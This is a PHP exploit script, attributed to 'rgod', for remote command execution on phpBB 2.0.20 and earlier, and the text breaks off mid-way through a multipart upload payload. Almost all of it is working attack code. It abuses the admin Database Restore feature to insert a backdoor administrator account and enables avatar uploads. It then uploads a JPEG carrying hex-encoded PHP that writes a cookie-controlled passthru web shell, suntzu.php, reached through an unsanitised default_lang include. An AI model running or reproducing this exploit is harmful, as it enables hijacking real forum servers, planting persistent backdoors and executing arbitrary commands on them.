<pre>
<code><span style="font: 10pt Courier New;"><span class="general1-string">#!/usr/bin/php -q -d short_open_tag=on
&lt;?
echo &quot;PhpBB &lt;= v2.0.20 \&quot;Admin/Restore Database/default_lang remote commands execution\r\n&quot;;
echo &quot;by rgod rgod@autistici.org\r\n&quot;;
echo &quot;site: http://retrogod.altervista.org\r\n&quot;;
echo &quot;-&gt; you need an admin sid, works regardless of magic_quotes_gpc settings\r\n&quot;;
echo &quot;tested and working against a fresh PhpBB installation\r\n\r\n&quot;;

if ($argc&lt;5) {
echo &quot;Usage: php &quot;.$argv[0].&quot; host path sid cmd OPTIONS\r\n&quot;;
echo &quot;host:       target server (ip/hostname)\r\n&quot;;
echo &quot;path:       path to PhpBB\r\n&quot;;
echo &quot;sid:        session id\r\n&quot;;
echo &quot;cmd:        a shell command\r\n&quot;;
echo &quot;Options:\r\n&quot;;
echo &quot;   -p[port]:    specify a port other than 80\r\n&quot;;
echo &quot;   -P[ip:port]: specify a proxy\r\n&quot;;
echo &quot;Examples:\r\n&quot;;
echo &quot;php &quot;.$argv[0].&quot; localhost /phpbb/ 8db5cef976c7e0f51c25c92152b56881 cat config.php\r\n&quot;;
echo &quot;php &quot;.$argv[0].&quot; localhost /phpbb/ 8db5cef976c7e0f51c25c92152b56881 ls -la -p81\r\n&quot;;
echo &quot;php &quot;.$argv[0].&quot; localhost / 8db5cef976c7e0f51c25c92152b56881 ls -la -P1.1.1.1:80\r\n\r\n&quot;;
die;
}

/* explaination:

  if you have admin session id, you can enable avatar uploads, if not activated
  yet and you can store an arbitrary path for &quot;default_lang&quot; inside phpbb_config
  database table using the &quot;Database Restore&quot; feature. So you can upload a
  malicious avatar with php code as EXIF metadata content and submit a query like
  this:

  UPDATE phpbb_config SET config_value=CONCAT(&quot;english/../../images/avatars/297984465bc277af10.jpg&quot;,CHAR(0)) where config_name=&quot;default_lang&quot;;

  note: you can see avatar filename in profile page

  in faq.php, like in other files, near line 62, we have:

  ...
  include($phpbb_root_path . 'language/lang_' . $board_config['default_lang'] . '/' . $lang_file . '.' . $phpEx);
  ...

  $board_config['default_lang'] var is not sanitized before to be used
  to include files, so you can reach the malicious avatar to execute the code
  inside of it.

  This tool also creates a &quot;suntzu&quot; user with password &quot;suntzu&quot; and a backdoor
  called suntzu.php, so you do not need sid after the first run
								              */
error_reporting(0);
ini_set(&quot;max_execution_time&quot;,0);
ini_set(&quot;default_socket_timeout&quot;,5);

function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i&lt;=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) &lt;= 32 ) | (ord($string[$i]) &gt; 126 ))
   {$result.=&quot;  .&quot;;}
   else
   {$result.=&quot;  &quot;.$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=&quot; &quot;.dechex(ord($string[$i]));}
   else
   {$exa.=&quot; 0&quot;.dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.=&quot;\r\n&quot;; $exa.=&quot;\r\n&quot;;}
  }
 return $exa.&quot;\r\n&quot;.$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo &quot;Connecting to &quot;.$parts[0].&quot;:&quot;.$parts[1].&quot; proxy...\r\n&quot;;
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
  #debug
  #echo &quot;\r\n&quot;.$html;

}

$host=$argv[1];
$path=$argv[2];
$cmd=&quot;&quot;;$port=80;$proxy=&quot;&quot;;
for ($i=4; $i&lt;=$argc-1; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if (($temp&lt;&gt;&quot;-p&quot;) and ($temp&lt;&gt;&quot;-P&quot;))
{$cmd.=&quot; &quot;.$argv[$i];}
if ($temp==&quot;-p&quot;)
{
  $port=str_replace(&quot;-p&quot;,&quot;&quot;,$argv[$i]);
}
if ($temp==&quot;-P&quot;)
{
  $proxy=str_replace(&quot;-P&quot;,&quot;&quot;,$argv[$i]);
}
}
$cmd=urlencode($cmd);
if (($path[0]&lt;&gt;'/') or ($path[strlen($path)-1]&lt;&gt;'/')) {echo 'Error... check the path!'; die;}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}



echo &quot;step 0 -&gt; check if suntzu.php is already installed...\r\n&quot;;
$packet =&quot;GET &quot;.$p.&quot;suntzu.php HTTP/1.0\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;Cookie: cmd=&quot;.$cmd.&quot;;\r\n&quot;;
$packet.=&quot;Connection: Close\r\n\r\n&quot;;
$packet.=$data;
sendpacketii($packet);
if (strstr($html,&quot;56789&quot;))
{
  echo &quot;Exploit succeeded...\r\n&quot;;
  $temp=explode(&quot;56789&quot;,$html);
  die(&quot;\r\n&quot;.$temp[1].&quot;\r\n&quot;);
}

echo &quot;Step 0b -&gt; check if exploit has already succeeded but suntzu.php deleted, try to login as suntzu...\r\n&quot;;
$data=&quot;username=suntzu&quot;;
$data.=&quot;&amp;password=suntzu&quot;;
$data.=&quot;&amp;redirect=&quot;.urlencode(&quot;admin/index.php?admin=1&quot;);
$data.=&quot;&amp;admin=1&quot;;
$data.=&quot;&amp;login=Log+in&quot;;
$packet=&quot;POST &quot;.$p.&quot;login.php HTTP/1.0\r\n&quot;;
$packet.=&quot;Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n&quot;;
$packet.=&quot;Referer: http://&quot;.$host.$path.&quot;/login.php\r\n&quot;;
$packet.=&quot;Accept-Language: it\r\n&quot;;
$packet.=&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
$packet.=&quot;Accept-Encoding: gzip, deflate\r\n&quot;;
$packet.=&quot;User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;Content-Length: &quot;.strlen($data).&quot;\r\n&quot;;
$packet.=&quot;Connection: Close\r\n&quot;;
$packet.=&quot;Cache-Control: no-cache\r\n\r\n&quot;;
$packet.=$data;
sendpacketii($packet);
$temp=explode(&quot;Set-Cookie: &quot;,$html);
$temp2=explode(&quot; &quot;,$temp[3]);
$cookie=$temp2[0];
$temp2=explode(&quot; &quot;,$temp[4]);
$cookie.=&quot; &quot;.$temp2[0];
$temp=explode(&quot;admin=1&amp;sid=&quot;,$html);
$temp2=explode(&quot;\n&quot;,$temp[1]);
$session_id=trim($temp2[0]);
if (($cookie=='') | ($session_id=='')) {
echo &quot;step 0c -&gt; query database to create a \&quot;suntzu\&quot; user with password \&quot;suntzu\&quot;...\r\n&quot;;
$session_id=trim($argv[3]);
//usually admin user_id is &quot;2&quot;, so you need only session id... however, if you have admin cookie, specify it literally
$cookie=&quot;phpbb2mysql_data=a%3A2%3A%7Bs%3A11%3A%22autologinid%22%3Bs%3A0%3A%22%22%3Bs%3A6%3A%22userid%22%3Bs%3A1%3A%222%22%3B%7D; phpbb2mysql_sid=&quot;;
$cookie.=$session_id.&quot;;&quot;;
$sql=&quot;
#
# let's create a new admin user
#

INSERT INTO phpbb_users(user_id,user_active,username,user_password,user_level,user_email) VALUES ('999999','1','suntzu','d33d57efba4c05808b5d16532f9d1567','1','suntzu\@fakemail.com');

&quot;;

$data='-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;backup_file&quot;; filename=&quot;suntzu.sql&quot;;
Content-Type: text/plain

'.$sql.'
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;perform&quot;

restore
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;restore_start&quot;

Start Restore
-----------------------------7d62702f250530--
';

$packet=&quot;POST &quot;.$p.&quot;admin/admin_db_utilities.php?sid=&quot;.$session_id.&quot; HTTP/1.0\r\n&quot;;
$packet.=&quot;Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n&quot;;
$packet.=&quot;Referer: http://&quot;.$host.$path.&quot;profile.php?mode=editprofile\r\n&quot;;
$packet.=&quot;Accept-Language: it\r\n&quot;;
$packet.=&quot;Content-Type: multipart/form-data; boundary=---------------------------7d62702f250530\r\n&quot;;
$packet.=&quot;Accept-Encoding: gzip, deflate\r\n&quot;;
$packet.=&quot;User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;Content-Length: &quot;.strlen($data).&quot;\r\n&quot;;
$packet.=&quot;Connection: Close\r\n&quot;;
$packet.=&quot;Cache-Control: no-cache\r\n&quot;;
$packet.=&quot;Cookie: &quot;.$cookie.&quot;\r\n\r\n&quot;;
$packet.=$data;
sendpacketii($packet);
if (eregi(&quot;The Database has been successfully restored&quot;,$html))
{
echo &quot;Done...\r\n&quot;;
}
else
{
die(&quot;Unable to modify table... maybe wrong admin sid\r\n&quot;);
}
}
else
{
echo &quot;Cookie -&gt;&quot;.$cookie.&quot;\r\n&quot;;
echo &quot;sid -&gt;&quot;.urlencode($session_id).&quot;\r\n\r\n&quot;;
}

echo &quot;Step 1 -&gt; Login as suntzu...\r\n&quot;;
$data=&quot;username=suntzu&quot;;
$data.=&quot;&amp;password=suntzu&quot;;
$data.=&quot;&amp;redirect=&quot;.urlencode(&quot;admin/index.php?admin=1&quot;);
$data.=&quot;&amp;admin=1&quot;;
$data.=&quot;&amp;login=Log+in&quot;;
$packet=&quot;POST &quot;.$p.&quot;login.php HTTP/1.0\r\n&quot;;
$packet.=&quot;Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n&quot;;
$packet.=&quot;Referer: http://&quot;.$host.$path.&quot;/login.php\r\n&quot;;
$packet.=&quot;Accept-Language: it\r\n&quot;;
$packet.=&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
$packet.=&quot;Accept-Encoding: gzip, deflate\r\n&quot;;
$packet.=&quot;User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;Content-Length: &quot;.strlen($data).&quot;\r\n&quot;;
$packet.=&quot;Connection: Close\r\n&quot;;
$packet.=&quot;Cache-Control: no-cache\r\n\r\n&quot;;
$packet.=$data;
sendpacketii($packet);
$temp=explode(&quot;Set-Cookie: &quot;,$html);
$temp2=explode(&quot; &quot;,$temp[3]);
$cookie=$temp2[0];
$temp2=explode(&quot; &quot;,$temp[4]);
$cookie.=&quot; &quot;.$temp2[0];
echo &quot;Cookie -&gt;&quot;.$cookie.&quot;\r\n&quot;;
$temp=explode(&quot;admin=1&amp;sid=&quot;,$html);
$temp2=explode(&quot;\n&quot;,$temp[1]);
$session_id=trim($temp2[0]);
echo &quot;sid -&gt;&quot;.urlencode($session_id).&quot;\r\n\r\n&quot;;
if (($cookie=='') | ($session_id=='')) {die(&quot;Unable to login...&quot;);}

echo &quot;step 2 -&gt; enable avatar uploads, if not enabled yet...\r\n&quot;;
$data='-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;server_name&quot;

'.$host.'
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;server_port&quot;

'.$port.'
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;script_path&quot;

'.$path.'
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;sitename&quot;

yourdomain.com
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;site_desc&quot;

A _little_ text to describe your forum
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;board_disable&quot;

0
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;require_activation&quot;

0
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;enable_confirm&quot;

0
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;allow_autologin&quot;

1
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;max_autologin_time&quot;

0
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;board_email_form&quot;

0
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;flood_interval&quot;

1
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;search_flood_interval&quot;

1
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;max_login_attempts&quot;

99
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;login_reset_time&quot;

30
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;topics_per_page&quot;

50
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;posts_per_page&quot;

15
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;hot_threshold&quot;

25
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;default_style&quot;

1
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;override_user_style&quot;

1
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;default_lang&quot;

english
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;default_dateformat&quot;

D M d, Y g:i a
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;board_timezone&quot;

1
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;gzip_compress&quot;

0
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;prune_enable&quot;

1
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;cookie_domain&quot;


-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;cookie_name&quot;

phpbb2mysql
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;cookie_path&quot;

/
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;cookie_secure&quot;;

0
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;session_length&quot;

3600
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;privmsg_disable&quot;

1
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;max_inbox_privmsgs&quot;

50
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;max_sentbox_privmsgs&quot;

25
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;max_savebox_privmsgs&quot;

50
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;max_poll_options&quot;

50
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;allow_html&quot;

1
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;allow_html_tags&quot;

b,i,u,pre
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;allow_bbcode&quot;

1
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;allow_smilies&quot;

1
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;smilies_path&quot;

images/smiles
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;allow_sig&quot;

1
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;max_sig_chars&quot;

255
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;allow_namechange&quot;

1
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;allow_avatar_local&quot;

1
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;allow_avatar_remote&quot;

1
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;allow_avatar_upload&quot;

1
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;avatar_filesize&quot;

6144
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;avatar_max_height&quot;

100
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;avatar_max_width&quot;

100
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;avatar_path&quot;

images/avatars
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;avatar_gallery_path&quot;

images/avatars/gallery
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;coppa_fax&quot;


-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;coppa_mail&quot;


-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;board_email&quot;


-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;board_email_sig&quot;

Thanks, The Suntzu S.p.A.
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;smtp_delivery&quot;

0
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;smtp_host&quot;


-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;smtp_username&quot;


-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;smtp_password&quot;


-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;submit&quot;

Submit
----------------------------7d62702f250530--
';

$packet=&quot;POST &quot;.$p.&quot;admin/admin_board.php?sid=&quot;.$session_id.&quot; HTTP/1.0\r\n&quot;;
$packet.=&quot;Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n&quot;;
$packet.=&quot;Referer: http://&quot;.$host.$path.&quot;admin/admin_board.php?sid=&quot;.$session_id.&quot;\r\n&quot;;
$packet.=&quot;Accept-Language: it\r\n&quot;;
$packet.=&quot;Content-Type: multipart/form-data; boundary=---------------------------7d62702f250530\r\n&quot;;
$packet.=&quot;Accept-Encoding: gzip, deflate\r\n&quot;;
$packet.=&quot;User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;Content-Length: &quot;.strlen($data).&quot;\r\n&quot;;
$packet.=&quot;Connection: Close\r\n&quot;;
$packet.=&quot;Cache-Control: no-cache\r\n&quot;;
$packet.=&quot;Cookie: &quot;.$cookie.&quot;\r\n\r\n&quot;;
$packet.=$data;
sendpacketii($packet);
if (eregi(&quot;Forum Configuration Updated Successfully&quot;,$html))
{
echo &quot;Done...\r\n&quot;;
}
else
{echo(&quot;Unable to modify configuration...&quot;);}

echo &quot;step 3 -&gt; upload an avatar with php code as EXIF metadata content...\r\n&quot;;
$avatar=
chr(0xff).chr(0xd8).chr(0xff).chr(0xfe).chr(0x01).chr(0x07).chr(0x3c).chr(0x3f).
chr(0x70).chr(0x68).chr(0x70).chr(0x0d).chr(0x0a).chr(0x24).chr(0x66).chr(0x70).
chr(0x3d).chr(0x66).chr(0x6f).chr(0x70).chr(0x65).chr(0x6e).chr(0x28).chr(0x22).
chr(0x73).chr(0x75).chr(0x6e).chr(0x74).chr(0x7a).chr(0x75).chr(0x2e).chr(0x70).
chr(0x68).chr(0x70).chr(0x22).chr(0x2c).chr(0x22).chr(0x77).chr(0x22).chr(0x29).
chr(0x3b).chr(0x0d).chr(0x0a).chr(0x66).chr(0x70).chr(0x75).chr(0x74).chr(0x73).
chr(0x28).chr(0x24).chr(0x66).chr(0x70).chr(0x2c).chr(0x22).chr(0x3c).chr(0x3f).
chr(0x70).chr(0x68).chr(0x70).chr(0x20).chr(0x65).chr(0x72).chr(0x72).chr(0x6f).
chr(0x72).chr(0x5f).chr(0x72).chr(0x65).chr(0x70).chr(0x6f).chr(0x72).chr(0x74).
chr(0x69).chr(0x6e).chr(0x67).chr(0x28).chr(0x30).chr(0x29).chr(0x3b).chr(0x73).
chr(0x65).chr(0x74).chr(0x5f).chr(0x74).chr(0x69).chr(0x6d).chr(0x65).chr(0x5f).
chr(0x6c).chr(0x69).chr(0x6d).chr(0x69).chr(0x74).chr(0x28).chr(0x30).chr(0x29).
chr(0x3b).chr(0x69).chr(0x66).chr(0x20).chr(0x28).chr(0x67).chr(0x65).chr(0x74).
chr(0x5f).chr(0x6d).chr(0x61).chr(0x67).chr(0x69).chr(0x63).chr(0x5f).chr(0x71).
chr(0x75).chr(0x6f).chr(0x74).chr(0x65).chr(0x73).chr(0x5f).chr(0x67).chr(0x70).
chr(0x63).chr(0x28).chr(0x29).chr(0x29).chr(0x20).chr(0x7b).chr(0x5c).chr(0x24).
chr(0x5f).chr(0x43).chr(0x4f).chr(0x4f).chr(0x4b).chr(0x49).chr(0x45).chr(0x5b).
chr(0x63).chr(0x6d).chr(0x64).chr(0x5d).chr(0x3d).chr(0x73).chr(0x74).chr(0x72).
chr(0x69).chr(0x70).chr(0x73).chr(0x6c).chr(0x61).chr(0x73).chr(0x68).chr(0x65).
chr(0x73).chr(0x28).chr(0x5c).chr(0x24).chr(0x5f).chr(0x43).chr(0x4f).chr(0x4f).
chr(0x4b).chr(0x49).chr(0x45).chr(0x5b).chr(0x63).chr(0x6d).chr(0x64).chr(0x5d).
chr(0x29).chr(0x3b).chr(0x7d).chr(0x65).chr(0x63).chr(0x68).chr(0x6f).chr(0x20).
chr(0x35).chr(0x36).chr(0x37).chr(0x38).chr(0x39).chr(0x3b).chr(0x70).chr(0x61).
chr(0x73).chr(0x73).chr(0x74).chr(0x68).chr(0x72).chr(0x75).chr(0x28).chr(0x5c).
chr(0x24).chr(0x5f).chr(0x43).chr(0x4f).chr(0x4f).chr(0x4b).chr(0x49).chr(0x45).
chr(0x5b).chr(0x63).chr(0x6d).chr(0x64).chr(0x5d).chr(0x29).chr(0x3b).chr(0x65).
chr(0x63).chr(0x68).chr(0x6f).chr(0x20).chr(0x35).chr(0x36).chr(0x37).chr(0x38).
chr(0x39).chr(0x3b).chr(0x3f).chr(0x3e).chr(0x22).chr(0x29).chr(0x3b).chr(0x0d).
chr(0x0a).chr(0x66).chr(0x63).chr(0x6c).chr(0x6f).chr(0x73).chr(0x65).chr(0x28).
chr(0x24).chr(0x66).chr(0x70).chr(0x29).chr(0x3b).chr(0x0d).chr(0x0a).chr(0x63).
chr(0x68).chr(0x6d).chr(0x6f).chr(0x64).chr(0x28).chr(0x22).chr(0x73).chr(0x75).
chr(0x6e).chr(0x74).chr(0x7a).chr(0x75).chr(0x2e).chr(0x70).chr(0x68).chr(0x70).
chr(0x22).chr(0x2c).chr(0x37).chr(0x37).chr(0x37).chr(0x29).chr(0x3b).chr(0x0d).
chr(0x0a).chr(0x3f).chr(0x3e).chr(0xff).chr(0xe0).chr(0x00).chr(0x10).chr(0x4a).
chr(0x46).chr(0x49).chr(0x46).chr(0x00).chr(0x01).chr(0x01).chr(0x01).chr(0x00).
chr(0x48).chr(0x00).chr(0x48).chr(0x00).chr(0x00).chr(0xff).chr(0xdb).chr(0x00).
chr(0x43).chr(0x00).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
chr(0x01).chr(0x01).chr(0xff).chr(0xdb).chr(0x00).chr(0x43).chr(0x01).chr(0x01).
chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0xff).
chr(0xc0).chr(0x00).chr(0x11).chr(0x08).chr(0x00).chr(0x01).chr(0x00).chr(0x01).
chr(0x03).chr(0x01).chr(0x11).chr(0x00).chr(0x02).chr(0x11).chr(0x01).chr(0x03).
chr(0x11).chr(0x01).chr(0xff).chr(0xc4).chr(0x00).chr(0x14).chr(0x00).chr(0x01).
chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).
chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x08).
chr(0xff).chr(0xc4).chr(0x00).chr(0x14).chr(0x10).chr(0x01).chr(0x00).chr(0x00).
chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).
chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0xff).chr(0xc4).
chr(0x00).chr(0x15).chr(0x01).chr(0x01).chr(0x01).chr(0x00).chr(0x00).chr(0x00).
chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).
chr(0x00).chr(0x00).chr(0x00).chr(0x08).chr(0x09).chr(0xff).chr(0xc4).chr(0x00).
chr(0x14).chr(0x11).chr(0x01).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).
chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).
chr(0x00).chr(0x00).chr(0x00).chr(0xff).chr(0xda).chr(0x00).chr(0x0c).chr(0x03).
chr(0x01).chr(0x00).chr(0x02).chr(0x11).chr(0x03).chr(0x11).chr(0x00).chr(0x3f).
chr(0x00).chr(0x23).chr(0x94).chr(0x09).chr(0x2e).chr(0xff).chr(0xd9).chr(0x00);

/*
this image has this code inside as EXIF metadata content
&lt;?php
$fp=fopen(&quot;suntzu.php&quot;,&quot;w&quot;);
fputs($fp,&quot;&lt;?php error_reporting(0);set_time_limit(0);if (get_magic_quotes_gpc()) {\$_COOKIE[cmd]=stripslashes(\$_COOKIE[cmd]);}echo 56789;passthru(\$_COOKIE[cmd]);echo 56789;?&gt;&quot;);
fclose($fp);
chmod(&quot;suntzu.php&quot;,777);
?&gt;
*/

$data='-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;username&quot;

suntzu
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;email&quot;

suntzu@fakemail.com
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;cur_password&quot;


-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;new_password&quot;


-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;password_confirm&quot;


-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;icq&quot;


-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;aim&quot;


-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;msn&quot;


-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;yim&quot;


-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;website&quot;


-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;location&quot;


-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;occupation&quot;


-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;interests&quot;


-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;signature&quot;

suntzu giving you the pain
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;viewemail&quot;

1
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;hideonline&quot;

1
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;notifyreply&quot;

1
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;notifypm&quot;

1
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;popup_pm&quot;

1
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;attachsig&quot;

1
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;allowbbcode&quot;

1
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;allowhtml&quot;

1
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;allowsmilies&quot;

1
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;language&quot;

italian
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;style&quot;

1047
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;timezone&quot;

2
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;dateformat&quot;

D M d, Y g:i a
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;MAX_FILE_SIZE&quot;

100000
-----------------------------7d62702f250530
